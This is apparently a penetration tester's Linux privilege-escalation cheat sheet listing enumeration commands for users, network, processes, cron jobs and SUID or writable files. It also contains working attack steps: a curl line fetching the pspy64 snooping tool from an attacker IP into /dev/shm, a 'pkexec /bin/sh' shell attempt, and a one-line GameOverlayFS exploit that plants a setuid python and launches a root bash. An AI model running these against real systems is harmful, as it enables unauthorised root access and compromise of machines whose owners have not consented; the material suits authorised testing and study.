
# Box Survey
## Get box and user info  
```
date;id;w;uname -a; cat /etc/os*
```

```
printenv  
```


## Network stack  
```
ifconfig
```

```
ip a
```

```
ss -tulpn
```

```
netstat -tulpn
```

```
route
```

## Get-Processes  
```
ps -auxwwef
```

## Check for sudo privileges  
```
sudo -l
```
  
## View all available disks  
```
lsblk
```
  

# Snoop on processes  
```
curl http://192.168.45.193/pspy64 -o /dev/shm/pspy64
```

```
chmod +x /dev/shm/pspy64
```

```
./pspy64
```

  


# pkexec  

```
cat /etc/polkit-1/localauthority.conf.d/*
```

```
pkexec "/bin/sh"
```
  
# View kernel modules  
```
lsmod
```
  
# Get cron jobs

```
ls -latr /etc/*cron*  
ls -latr /etc/at*  
ls -latr /var/spool/cron/*  
grep 'CRON' /var/log/syslog  
```

# List packages on a Debian system  

```
dpkg -l  
```

# Find
## View files with the SUID bit set  
```
find / -perm -u=s -type f 2>/dev/null
```

## Directories writable by the current user  
```
find / -writable -type d 2>/dev/null
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
  
## Directories that everyone can execute in  
```
find / -perm -o x -type d 2>/dev/null
```

## Writable Files
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## GameOverLayFS Vulnerability (Ubuntu ) 

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```